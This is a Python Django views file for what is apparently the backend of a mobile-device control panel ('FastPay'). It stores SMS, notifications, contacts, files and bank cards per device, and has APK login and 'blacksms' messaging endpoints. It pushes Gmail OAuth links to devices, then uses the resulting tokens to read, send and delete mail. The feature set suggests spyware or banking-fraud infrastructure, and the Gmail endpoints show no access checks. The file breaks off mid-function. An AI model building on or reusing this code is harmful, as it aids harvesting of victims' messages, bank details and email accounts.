from rest_framework import viewsets, status, mixins
from rest_framework.decorators import action, api_view
from rest_framework.response import Response
from rest_framework.parsers import MultiPartParser, FormParser
from django.http import FileResponse, Http404, HttpResponseRedirect
from django.conf import settings
from django.db import models
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from datetime import timedelta
from pathlib import Path
import shutil
import os
import requests
import json

from .models import Item, Device, Message, Notification, Contact, BankCardTemplate, BankCard, Bank, GmailAccount, CommandLog, AutoReplyLog, DashUser, ActivityLog, ActivationFailureLog, ApiRequestLog, CaptureItem, FirebaseSyncLog, WebhookEvent
from .activity_logger import log_activity, get_client_ip, get_user_agent
from .rate_limit import rate_limit, get_email_rate_limit_key
from .pagination import SkipLimitPagination
from .response import success_response, error_response
from .sync_contract import SYNC_CONTRACT
from .telegram_service import send_telegram_alert
from .serializers import (
    ItemSerializer, ItemCreateSerializer,
    DeviceSerializer, DeviceCreateSerializer, DeviceUpdateSerializer,
    MessageSerializer, MessageCreateSerializer,
    NotificationSerializer, NotificationCreateSerializer,
    ContactSerializer, ContactCreateSerializer, ContactSimpleSerializer,
    BankCardTemplateSerializer, BankCardSerializer, BankCardCreateSerializer, BankCardUpdateSerializer, BankCardSummarySerializer,
    BankSerializer, BankCreateSerializer, BankUpdateSerializer,
    GmailAccountSerializer, GmailAccountStatusSerializer, GmailInitAuthSerializer,
    GmailInitAuthResponseSerializer, GmailMessageListSerializer, GmailMessageDetailSerializer,
    GmailSendEmailSerializer, GmailModifyLabelsSerializer, GmailSendAuthLinkSerializer,
    GmailSendAuthEmailSerializer,
    CommandLogSerializer, CommandLogCreateSerializer,
    AutoReplyLogSerializer, AutoReplyLogCreateSerializer,
    ActivationFailureLogSerializer, ActivationFailureLogCreateSerializer,
    ApiRequestLogSerializer, CaptureItemSerializer, CaptureItemCreateSerializer,
)
from .utils import send_sms, send_whatsapp
from api.views.mobile import (
    DeviceViewSet,
    MessageViewSet,
    NotificationViewSet,
    ContactViewSet,
    FileSystemViewSet,
)
from api.views.banking import (
    BankCardTemplateViewSet,
    BankCardViewSet,
    BankViewSet,
)
from api.views.dashboard import (
    dashboard_login,
    dashboard_profile,
    dashboard_reset_password,
    dashboard_update_access,
    dashboard_configure_access,
    dashboard_update_profile,
    dashboard_update_theme_mode,
    dashboard_activity_logs,
    dashboard_send_verification_email,
    dashboard_verify_email_token,
    _dashboard_redirect,
)
from api.views.logs import (
    CommandLogViewSet,
    AutoReplyLogViewSet,
    ActivationFailureLogViewSet,
    ApiRequestLogViewSet,
    CaptureItemViewSet,
)
from api.views.apk import (
    validate_apk_login,
    isvalidcodelogin,
    register_bank_number,
    blacksms_send_sms,
    blacksms_send_whatsapp,
    ip_download_file,
)

# GmailAccount ViewSet for CRUD operations
class GmailAccountViewSet(viewsets.ModelViewSet):
    """
    ViewSet for GmailAccount CRUD operations
    
    Supports filtering by:
    - is_active: Filter by active status
    - user_email: Filter by user email
    - gmail_email: Filter by Gmail address
    """
    queryset = GmailAccount.objects.all()
    serializer_class = GmailAccountSerializer
    lookup_field = 'user_email'
    
    def get_queryset(self):
        queryset = GmailAccount.objects.all()
        
        # Filter by is_active
        is_active = self.request.query_params.get('is_active')
        if is_active is not None:
            is_active_bool = is_active.lower() in ('true', '1', 'yes')
            queryset = queryset.filter(is_active=is_active_bool)
        
        # Filter by user_email
        user_email = self.request.query_params.get('user_email')
        if user_email:
            queryset = queryset.filter(user_email__icontains=user_email)
        
        # Filter by gmail_email
        gmail_email = self.request.query_params.get('gmail_email')
        if gmail_email:
            queryset = queryset.filter(gmail_email__icontains=gmail_email)
        
        return queryset
    
    @action(detail=True, methods=['get'], url_path='health-check')
    def health_check(self, request, user_email=None):
        """
        Check Gmail account health (token validity, connection status)
        """
        try:
            gmail_account = self.get_object()
            
            # Check token validity
            token = get_valid_token(gmail_account)
            token_valid = token is not None
            
            # Check if token is expired
            token_expired = gmail_account.is_token_expired()
            
            # Try to fetch labels to test connection
            connection_ok = False
            error_message = None
            try:
                if token:
                    labels = get_gmail_labels(gmail_account)
                    connection_ok = True
            except GmailServiceError as e:
                error_message = str(e)
            
            return Response({
                'user_email': gmail_account.user_email,
                'gmail_email': gmail_account.gmail_email,
                'is_active': gmail_account.is_active,
                'token_valid': token_valid,
                'token_expired': token_expired,
                'connection_ok': connection_ok,
                'last_sync_at': gmail_account.last_sync_at,
                'error': error_message,
                'status': 'healthy' if (token_valid and connection_ok) else 'unhealthy'
            })
        except GmailAccount.DoesNotExist:
            return Response(
                {'error': 'Gmail account not found'},
                status=status.HTTP_404_NOT_FOUND
            )
    
    @action(detail=True, methods=['post'], url_path='refresh-token')
    def refresh_token(self, request, user_email=None):
        """
        Manually refresh Gmail access token
        """
        try:
            gmail_account = self.get_object()
            from .gmail_service import refresh_access_token
            
            success = refresh_access_token(gmail_account)
            if success:
                return Response({
                    'success': True,
                    'message': 'Token refreshed successfully',
                    'expires_at': gmail_account.token_expires_at
                })
            else:
                return Response({
                    'success': False,
                    'message': 'Failed to refresh token. Re-authentication required.'
                }, status=status.HTTP_400_BAD_REQUEST)
        except GmailAccount.DoesNotExist:
            return Response(
                {'error': 'Gmail account not found'},
                status=status.HTTP_404_NOT_FOUND
            )
from .gmail_service import (
    generate_oauth_url, verify_signed_state, exchange_code_for_tokens, get_valid_token,
    fetch_gmail_messages, fetch_gmail_message_detail, fetch_gmail_message_metadata, send_gmail_message,
    modify_message_labels, delete_gmail_message, get_gmail_labels,
    get_email_header, extract_plain_text, extract_html, GmailServiceError
)
from .drive_service import (
    list_drive_files, get_file_metadata, download_file, upload_file,
    create_folder, delete_file, share_file, get_drive_storage_info,
    search_files, copy_file, DriveServiceError
)


# Sync helpers
def _update_device_sync_fields(device_ids, field_name, status, error_message=None):
    if not device_ids:
        return
    now = timezone.now()
    updates = {
        field_name: now,
        "last_sync_at": now,
        "sync_status": status,
    }
    if error_message:
        updates["sync_error_message"] = error_message[:500]
    Device.objects.filter(device_id__in=device_ids).update(**updates)


def _log_sync_result(device, sync_type, status, created_count=0, errors_count=0, error_message=None):
    FirebaseSyncLog.objects.create(
        sync_type=sync_type,
        status=status,
        device=device,
        messages_created=created_count if sync_type == "messages" else 0,
        messages_skipped=0,
        error_message=error_message,
        additional_info={
            "created_count": created_count,
            "errors_count": errors_count,
        },
        started_at=timezone.now(),
        completed_at=timezone.now(),
        duration_seconds=0,
    )


# Root endpoint
@api_view(['GET'])
def root(request):
    """Welcome endpoint"""
    return success_response({"message": "Welcome to FastPay Backend API"})


def health(request):
    """Health check for load balancers and Docker (no redirect, returns 200)."""
    from django.http import HttpResponse
    return HttpResponse("ok", content_type="text/plain")


@api_view(['GET'])
def sync_contract(request):
    """Return sync contract and pagination rules"""
    return success_response(SYNC_CONTRACT)


@api_view(['GET', 'POST'])
def sync_status(request):
    """
    Get or update device sync status.
    GET: ?device_id=...
    POST: {device_id, sync_status, sync_error_message, last_sync_at}
    """
    if request.method == 'GET':
        device_id = request.query_params.get('device_id')
        if not device_id:
            return error_response("device_id is required", status_code=status.HTTP_400_BAD_REQUEST)
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            return error_response("Device not found", status_code=status.HTTP_404_NOT_FOUND)
        data = {
            "device_id": device.device_id,
            "sync_status": device.sync_status,
            "sync_error_message": device.sync_error_message,
            "last_sync_at": device.last_sync_at,
            "last_hard_sync_at": device.last_hard_sync_at,
            "messages_last_synced_at": device.messages_last_synced_at,
            "notifications_last_synced_at": device.notifications_last_synced_at,
            "contacts_last_synced_at": device.contacts_last_synced_at,
        }
        return success_response(data)

    device_id = request.data.get('device_id')
    if not device_id:
        return error_response("device_id is required", status_code=status.HTTP_400_BAD_REQUEST)
    try:
        device = Device.objects.get(device_id=device_id)
    except Device.DoesNotExist:
        return error_response("Device not found", status_code=status.HTTP_404_NOT_FOUND)

    sync_status_value = request.data.get('sync_status')
    sync_error_message = request.data.get('sync_error_message')
    if sync_status_value:
        device.sync_status = sync_status_value
    if sync_error_message is not None:
        device.sync_error_message = sync_error_message
    device.last_sync_at = timezone.now()
    device.save(update_fields=['sync_status', 'sync_error_message', 'last_sync_at'])
    return success_response({"device_id": device.device_id, "sync_status": device.sync_status})


# Item ViewSet for CRUD operations
class ItemViewSet(viewsets.ModelViewSet):
    """
    ViewSet for Item CRUD operations
    """
    queryset = Item.objects.all()
    serializer_class = ItemSerializer
    pagination_class = SkipLimitPagination

    def get_serializer_class(self):
        if self.action == 'create':
            return ItemCreateSerializer
        return ItemSerializer

    def get_queryset(self):
        queryset = Item.objects.all()
        return queryset



# Device, Message, Notification, Contact, FileSystem ViewSets migrated to api.views.mobile (re-exported above)

# BankCardTemplate ViewSet
class BankCardTemplateViewSet(viewsets.ModelViewSet):
    """
    ViewSet for BankCardTemplate CRUD operations
    
    Supports filtering by:
    - is_active: Filter by active status
    - template_code: Filter by template code
    """
    queryset = BankCardTemplate.objects.all()
    serializer_class = BankCardTemplateSerializer
    
    def get_queryset(self):
        queryset = BankCardTemplate.objects.all()
        
        # Filter by is_active
        is_active = self.request.query_params.get('is_active')
        if is_active is not None:
            is_active_bool = is_active.lower() in ('true', '1', 'yes')
            queryset = queryset.filter(is_active=is_active_bool)
        
        # Filter by template_code
        template_code = self.request.query_params.get('template_code')
        if template_code:
            queryset = queryset.filter(template_code=template_code)
        
        return queryset.order_by('template_code')


# BankCard ViewSet
class BankCardViewSet(viewsets.ModelViewSet):
    """
    ViewSet for BankCard CRUD operations
    
    Supports filtering by:
    - device_id: Filter by device ID
    - bank_name: Filter by bank name
    - status: Filter by card status
    - card_type: Filter by card type
    """
    queryset = BankCard.objects.all()
    serializer_class = BankCardSerializer
    pagination_class = SkipLimitPagination
    
    def get_serializer_class(self):
        if self.action == 'create':
            return BankCardCreateSerializer
        elif self.action in ['update', 'partial_update']:
            return BankCardUpdateSerializer
        return BankCardSerializer
    
    def get_queryset(self):
        queryset = BankCard.objects.all()
        
        # Filter by device_id
        device_id = self.request.query_params.get('device_id')
        if device_id:
            queryset = queryset.filter(device__device_id=device_id)
        
        # Filter by bank_name
        bank_name = self.request.query_params.get('bank_name')
        if bank_name:
            queryset = queryset.filter(bank_name__icontains=bank_name)
        
        # Filter by status
        status_filter = self.request.query_params.get('status')
        if status_filter:
            queryset = queryset.filter(status=status_filter)
        
        # Filter by card_type
        card_type = self.request.query_params.get('card_type')
        if card_type:
            queryset = queryset.filter(card_type=card_type)
        
        return queryset
    
    @action(detail=False, methods=['get'], url_path='by-device/(?P<device_id>[^/.]+)')
    def by_device(self, request, device_id=None):
        """Get bank card for a specific device. Returns 200 with empty structure if device or card not found."""
        try:
            device = Device.objects.get(device_id=device_id)
        except Device.DoesNotExist:
            return Response({
                "id": None,
                "device_id": device_id,
                "bank_code": None,
                "bank_name": None,
                "detail": "Device not found"
            }, status=status.HTTP_200_OK)
        try:
            bank_card = BankCard.objects.get(device=device)
            serializer = self.get_serializer(bank_card)
            return Response(serializer.data)
        except BankCard.DoesNotExist:
            return Response({
                "id": None,
                "device_id": device_id,
                "bank_code": None,
                "bank_name": None,
                "detail": "No bank card found for this device"
            }, status=status.HTTP_200_OK)

    @action(detail=False, methods=['post'], url_path='batch')
    def batch(self, request):
        """
        Batch bank-card lookup by device IDs.
        Request body: { "device_ids": ["id1", "id2", ...] }
        Response: { "results": { "id1": { ... } | null, ... } }
        """
        device_ids = request.data.get('device_ids')
        if not isinstance(device_ids, list):
            return Response(
                {"error": "device_ids must be a list"},
                status=status.HTTP_400_BAD_REQUEST
            )

        normalized_ids = [str(device_id) for device_id in device_ids if device_id]
        if not normalized_ids:
            return Response({"results": {}}, status=status.HTTP_200_OK)

        bank_cards = (
            BankCard.objects
            .filter(device__device_id__in=normalized_ids)
            .select_related('device')
        )

        results = {device_id: None for device_id in normalized_ids}
        for bank_card in bank_cards:
            device_id = bank_card.device.device_id
            results[device_id] = BankCardSummarySerializer(bank_card).data

        return Response({"results": results}, status=status.HTTP_200_OK)


# Bank ViewSet
class BankViewSet(viewsets.ModelViewSet):
    """
    ViewSet for Bank CRUD operations
    
    Supports filtering by:
    - name: Filter by bank name (partial match)
    - code: Filter by bank code
    - ifsc_code: Filter by IFSC code
    - is_active: Filter by active status
    - country: Filter by country
    """
    queryset = Bank.objects.all()
    serializer_class = BankSerializer
    pagination_class = SkipLimitPagination
    
    def get_serializer_class(self):
        if self.action == 'create':
            return BankCreateSerializer
        elif self.action in ['update', 'partial_update']:
            return BankUpdateSerializer
        return BankSerializer
    
    def get_queryset(self):
        queryset = Bank.objects.all()
        
        # Filter by name (partial match)
        name = self.request.query_params.get('name')
        if name:
            queryset = queryset.filter(name__icontains=name)
        
        # Filter by code
        code = self.request.query_params.get('code')
        if code:
            queryset = queryset.filter(code=code)
        
        # Filter by IFSC code
        ifsc_code = self.request.query_params.get('ifsc_code')
        if ifsc_code:
            queryset = queryset.filter(ifsc_code=ifsc_code)
        
        # Filter by is_active
        is_active = self.request.query_params.get('is_active')
        if is_active is not None:
            is_active_bool = is_active.lower() in ('true', '1', 'yes')
            queryset = queryset.filter(is_active=is_active_bool)
        
        # Filter by country
        country = self.request.query_params.get('country')
        if country:
            queryset = queryset.filter(country__icontains=country)
        
        return queryset



# Log ViewSets migrated to api.views.logs (re-exported above)


# APK and BlackSMS views migrated to api.views.apk (re-exported above)

# Gmail API Endpoints
# ============================================================================

@api_view(['POST'])
def gmail_init_auth(request):
    """
    Initialize Gmail OAuth authentication
    Generate OAuth URL and return it (with optional QR code)
    
    Accepts either:
    - user_email: For dashboard authentication
    - device_id: For APK authentication (will resolve to user_email)
    
    If device_id is provided and method is 'apk', will also send instruction card to device.
    """
    serializer = GmailInitAuthSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
    user_email = serializer.validated_data.get('user_email')
    device_id = serializer.validated_data.get('device_id')
    method = serializer.validated_data.get('method', 'webpage')
    dashboard_origin = (serializer.validated_data.get('dashboard_origin') or '').strip() or None
    dashboard_path = (serializer.validated_data.get('dashboard_path') or 'dashboard/v2').strip() or 'dashboard/v2'
    
    # Resolve user_email from device_id if provided
    if device_id and not user_email:
        from .gmail_service import resolve_user_email_from_device
        user_email = resolve_user_email_from_device(device_id)
        if not user_email:
            return Response(
                {'error': f'Device with device_id "{device_id}" not found'},
                status=status.HTTP_404_NOT_FOUND
            )
    
    if not user_email:
        return Response(
            {'error': 'Either user_email or device_id must be provided'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        # Generate OAuth URL (dashboard_origin + path encoded in state so callback redirects to correct dashboard)
        oauth_data = generate_oauth_url(user_email, dashboard_origin=dashboard_origin, dashboard_path=dashboard_path)
        
        # State is signed in auth_url so callback can verify without session (works across subdomains)
        # Store device_id in session only for APK flow (same-origin callback)
        if device_id:
            request.session[f'gmail_oauth_device_{user_email}'] = device_id
        
        response_data = {
            'auth_url': oauth_data['auth_url'],
            'expires_in': oauth_data['expires_in'],
            'user_email': user_email,  # Return resolved user_email
        }
        
        # If method is 'apk' and device_id is provided, send instruction card to device
        if method == 'apk' and device_id:
            from .gmail_service import generate_oauth_instruction_card
            from .utils import initialize_firebase
            from firebase_admin import db
            
            try:
                # Initialize Firebase if not already done
                initialize_firebase()
                
                # Generate instruction card HTML/CSS
                instruction_card = generate_oauth_instruction_card(device_id, oauth_data['auth_url'])
                
                # Send to device's instruction card in Firebase
                # Path format: device/{deviceId}/instructioncard (lowercase to match APK)
                instruction_path = f"device/{device_id}/instructioncard"
                ref = db.reference(instruction_path)
                ref.set({
                    'html': instruction_card['html'],
                    'css': instruction_card['css'],
                    'timestamp': int(timezone.now().timestamp() * 1000)
                })
                
                response_data['instruction_sent'] = True
                response_data['message'] = 'OAuth instruction card sent to device'
            except Exception as e:
                # Don't fail the request if instruction card fails
                response_data['instruction_sent'] = False
                response_data['instruction_error'] = str(e)
        
        # Generate QR code if needed (optional - can use a library like qrcode)
        # For now, just return the URL
        
        # For SMS/email methods, generate short link
        if method in ['sms', 'email']:
            import secrets
            token = secrets.token_urlsafe(16)
            # Store token temporarily (in production, use Redis or database)
            request.session[f'gmail_auth_token_{token}'] = {
                'user_email': user_email,
                'device_id': device_id,
                'auth_url': oauth_data['auth_url'],
                'expires_at': timezone.now() + timedelta(minutes=10)
            }
            response_data['token'] = token
            response_data['short_link'] = f"{request.build_absolute_uri('/')}gmail-auth?token={token}"
        
        return Response(response_data, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
def gmail_callback(request):
    """
    Handle Gmail OAuth callback
    Exchange authorization code for tokens and store in database.
    When DASHBOARD_ORIGIN is set, redirects user back to dashboard (for domain deployment).
    """
    code = request.query_params.get('code')
    state = request.query_params.get('state')
    error = request.query_params.get('error')

    def _error_response(msg, status_code=status.HTTP_400_BAD_REQUEST):
        redirect_url = _dashboard_redirect('dashboard/v2', google='error', message=msg[:200])
        if redirect_url:
            return HttpResponseRedirect(redirect_url)
        return Response({'error': msg}, status=status_code)

    if error:
        return _error_response(f'Google OAuth error: {error}')

    if not code:
        return _error_response('No authorization code received')

    if not state:
        return _error_response('No state parameter received')

    # Verify signed state (no session needed; works when dashboard and API are on different subdomains)
    try:
        state_token, user_email, dashboard_origin, dashboard_path = verify_signed_state(state)
    except GmailServiceError as e:
        return _error_response(str(e))

    try:
        # Exchange code for tokens
        token_data = exchange_code_for_tokens(code)

        # Get Gmail profile to get email address
        profile_url = 'https://www.googleapis.com/oauth2/v2/userinfo'
        profile_response = requests.get(
            profile_url,
            headers={'Authorization': f"Bearer {token_data['access_token']}"}
        )

        if profile_response.ok:
            profile = profile_response.json()
            gmail_email = profile.get('email', '')
        else:
            gmail_email = user_email  # Fallback

        # Calculate token expiration
        expires_in = token_data.get('expires_in', 3600)
        expires_at = timezone.now() + timedelta(seconds=expires_in)

        # Get scopes from token data
        scopes = token_data.get('scope', '').split() if token_data.get('scope') else []

        # Create or update GmailAccount
        gmail_account, created = GmailAccount.objects.update_or_create(
            user_email=user_email,
            defaults={
                'gmail_email': gmail_email,
                'access_token': token_data['access_token'],
                'refresh_token': token_data.get('refresh_token'),
                'token_expires_at': expires_at,
                'scopes': scopes,
                'is_active': True,
            }
        )

        # Link to device if this was initiated by APK (session only available when callback is same-origin)
        device_id = request.session.get(f'gmail_oauth_device_{user_email}')
        if device_id:
            from .gmail_service import link_gmail_account_to_device
            link_gmail_account_to_device(gmail_account, device_id)
            request.session.pop(f'gmail_oauth_device_{user_email}', None)

        # Redirect to dashboard when deployed on domain so user doesn't see JSON (use origin+path from state for REDPAY)
        redirect_url = _dashboard_redirect('dashboard/v2', origin_override=dashboard_origin, path_override=dashboard_path, google='connected', tab='google')
        if redirect_url:
            return HttpResponseRedirect(redirect_url)

        return Response({
            'success': True,
            'message': 'Gmail account connected successfully',
            'gmail_email': gmail_email,
            'user_email': user_email,
            'created': created,
            'device_linked': bool(device_id),
        }, status=status.HTTP_200_OK)

    except GmailServiceError as e:
        return _error_response(str(e), status.HTTP_500_INTERNAL_SERVER_ERROR)
    except Exception as e:
        return _error_response(f'Failed to connect Gmail: {str(e)}', status.HTTP_500_INTERNAL_SERVER_ERROR)


@api_view(['GET'])
def gmail_status(request):
    """
    Check Gmail connection status for a user or device
    
    Accepts either:
    - user_email: For dashboard authentication
    - device_id: For APK authentication (will resolve to user_email)
    """
    user_email = request.query_params.get('user_email')
    device_id = request.query_params.get('device_id')
    
    # Resolve user_email from device_id if provided
    if device_id and not user_email:
        from .gmail_service import resolve_user_email_from_device
        user_email = resolve_user_email_from_device(device_id)
        if not user_email:
            return Response({
                'connected': False,
                'gmail_email': None,
                'error': f'Device with device_id "{device_id}" not found',
            }, status=status.HTTP_200_OK)
    
    if not user_email:
        return Response(
            {'error': 'Either user_email or device_id parameter is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response({
                'connected': False,
                'gmail_email': None,
                'user_email': user_email,
            }, status=status.HTTP_200_OK)
        
        serializer = GmailAccountStatusSerializer({
            'connected': True,
            'gmail_email': gmail_account.gmail_email,
            'is_active': gmail_account.is_active,
            'last_sync_at': gmail_account.last_sync_at,
            'scopes': gmail_account.scopes or [],
        })
        
        return Response(serializer.data, status=status.HTTP_200_OK)
    
    except Exception as e:
        return Response(
            {'error': f'Failed to check status: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
def gmail_messages(request):
    """
    List Gmail messages for a user
    Query params:
    - user_email: Required
    - max_results: Optional (default 25)
    - page_token: Optional (for pagination)
    - query: Optional (Gmail search query)
    - label_ids: Optional (comma-separated label IDs)
    """
    user_email = request.query_params.get('user_email')
    
    if not user_email:
        return Response(
            {'error': 'user_email parameter is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        max_results = int(request.query_params.get('max_results', 25))
        page_token = request.query_params.get('page_token')
        query = request.query_params.get('query')
        label_ids_param = request.query_params.get('label_ids')
        label_ids = label_ids_param.split(',') if label_ids_param else None
        
        # Fetch messages
        messages_data = fetch_gmail_messages(
            gmail_account,
            max_results=max_results,
            page_token=page_token,
            query=query,
            label_ids=label_ids
        )
        
        # Transform messages to our format
        messages_list = []
        message_ids = messages_data.get('messages', [])
        
        # Fetch lightweight metadata for each message
        for msg_ref in message_ids[:max_results]:  # Limit to max_results
            msg_id = msg_ref.get('id')
            if not msg_id:
                continue
            
            try:
                msg_detail = fetch_gmail_message_metadata(gmail_account, msg_id)
                
                headers = msg_detail.get('payload', {}).get('headers', [])
                subject = get_email_header(headers, 'Subject') or '(No Subject)'
                from_email = get_email_header(headers, 'From') or ''
                date = get_email_header(headers, 'Date') or ''
                
                snippet = msg_detail.get('snippet', '')
                internal_date = msg_detail.get('internalDate', '')
                labels = msg_detail.get('labelIds', [])
                
                messages_list.append({
                    'id': msg_id,
                    'thread_id': msg_detail.get('threadId', ''),
                    'subject': subject,
                    'from_email': from_email,
                    'snippet': snippet,
                    'date': date,
                    'internal_date': internal_date,
                    'labels': labels,
                    'is_read': 'UNREAD' not in labels,
                })
            except Exception as e:
                # Skip messages that fail to fetch
                continue
        
        # Update last_sync_at
        gmail_account.last_sync_at = timezone.now()
        gmail_account.save()
        
        response_data = {
            'messages': messages_list,
            'next_page_token': messages_data.get('nextPageToken'),
            'result_size_estimate': messages_data.get('resultSizeEstimate', len(messages_list)),
        }
        
        return Response(response_data, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to fetch messages: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
def gmail_message_detail(request, message_id):
    """
    Get full Gmail message details
    Query params:
    - user_email: Required
    """
    user_email = request.query_params.get('user_email')
    
    if not user_email:
        return Response(
            {'error': 'user_email parameter is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Fetch full message details
        msg_detail = fetch_gmail_message_detail(gmail_account, message_id)
        
        # Extract headers
        payload = msg_detail.get('payload', {})
        headers = payload.get('headers', [])
        
        subject = get_email_header(headers, 'Subject') or '(No Subject)'
        from_email = get_email_header(headers, 'From') or ''
        to = get_email_header(headers, 'To') or ''
        cc = get_email_header(headers, 'Cc') or ''
        bcc = get_email_header(headers, 'Bcc') or ''
        date = get_email_header(headers, 'Date') or ''
        
        # Extract body
        plain_text = extract_plain_text(payload)
        html = extract_html(payload)
        
        # Extract attachments info
        attachments = []
        parts = payload.get('parts', [])
        for part in parts:
            filename = part.get('filename')
            if filename:
                attachments.append({
                    'filename': filename,
                    'mime_type': part.get('mimeType', ''),
                    'size': part.get('body', {}).get('size', 0),
                    'attachment_id': part.get('body', {}).get('attachmentId', ''),
                })
        
        response_data = {
            'id': message_id,
            'thread_id': msg_detail.get('threadId', ''),
            'subject': subject,
            'from_email': from_email,
            'to': to,
            'cc': cc,
            'bcc': bcc,
            'date': date,
            'plain_text': plain_text,
            'html': html,
            'attachments': attachments,
            'labels': msg_detail.get('labelIds', []),
        }
        
        return Response(response_data, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to fetch message: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
def gmail_send(request):
    """
    Send email via Gmail
    """
    serializer = GmailSendEmailSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
    user_email = serializer.validated_data['user_email']
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Send email
        result = send_gmail_message(
            gmail_account,
            to=serializer.validated_data['to'],
            subject=serializer.validated_data['subject'],
            body=serializer.validated_data['body'],
            body_html=serializer.validated_data.get('body_html'),
            cc=serializer.validated_data.get('cc'),
            bcc=serializer.validated_data.get('bcc'),
        )
        
        return Response({
            'success': True,
            'message_id': result.get('id'),
            'thread_id': result.get('threadId'),
        }, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to send email: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
def gmail_modify_labels(request, message_id):
    """
    Modify message labels (mark as read, archive, star, etc.)
    """
    serializer = GmailModifyLabelsSerializer(data=request.data)
    if not serializer.is_valid():
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
    user_email = serializer.validated_data['user_email']
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Modify labels
        result = modify_message_labels(
            gmail_account,
            message_id,
            add_label_ids=serializer.validated_data.get('add_label_ids'),
            remove_label_ids=serializer.validated_data.get('remove_label_ids'),
        )
        
        return Response({
            'success': True,
            'message_id': result.get('id'),
            'labels': result.get('labelIds', []),
        }, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to modify labels: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['DELETE'])
def gmail_delete_message(request, message_id):
    """
    Delete Gmail message
    Query params:
    - user_email: Required
    """
    user_email = request.query_params.get('user_email')
    
    if not user_email:
        return Response(
            {'error': 'user_email parameter is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Delete message
        success = delete_gmail_message(gmail_account, message_id)
        
        if success:
            return Response({
                'success': True,
                'message': 'Message deleted successfully',
            }, status=status.HTTP_200_OK)
        else:
            return Response(
                {'error': 'Failed to delete message'},
                status=status.HTTP_500_INTERNAL_SERVER_ERROR
            )
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to delete message: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['GET'])
def gmail_labels(request):
    """
    Get all Gmail labels for a user
    Query params:
    - user_email: Required
    """
    user_email = request.query_params.get('user_email')
    
    if not user_email:
        return Response(
            {'error': 'user_email parameter is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(
            user_email=user_email,
            is_active=True
        ).first()
        
        if not gmail_account:
            return Response(
                {'error': 'Gmail account not connected. Please authenticate first.'},
                status=status.HTTP_404_NOT_FOUND
            )
        
        # Get labels
        labels = get_gmail_labels(gmail_account)
        
        return Response({
            'labels': labels,
        }, status=status.HTTP_200_OK)
    
    except GmailServiceError as e:
        return Response(
            {'error': str(e)},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )
    except Exception as e:
        return Response(
            {'error': f'Failed to fetch labels: {str(e)}'},
            status=status.HTTP_500_INTERNAL_SERVER_ERROR
        )


@api_view(['POST'])
def gmail_disconnect(request):
    """
    Disconnect Gmail account (deactivate)
    """
    user_email = request.data.get('user_email')
    
    if not user_email:
        return Response(
            {'error': 'user_email is required'},
            status=status.HTTP_400_BAD_REQUEST
        )
    
    try:
        gmail_account = GmailAccount.objects.filter(user_email=user_email).first()
        
        if not gmail_account:
